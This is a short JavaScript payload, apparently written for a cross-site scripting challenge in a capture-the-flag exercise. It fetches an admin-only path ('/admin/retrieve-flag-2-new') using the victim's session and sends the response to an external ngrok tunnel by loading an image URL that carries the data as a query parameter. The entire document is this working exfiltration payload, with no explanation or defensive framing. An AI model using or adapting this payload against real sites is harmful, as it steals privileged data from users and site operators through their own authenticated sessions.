fetch("/admin/retrieve-flag-2-new")
.then(r=>r.text())
.then(f=>{
new Image().src="https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app?flag="+encodeURIComponent(f)
})
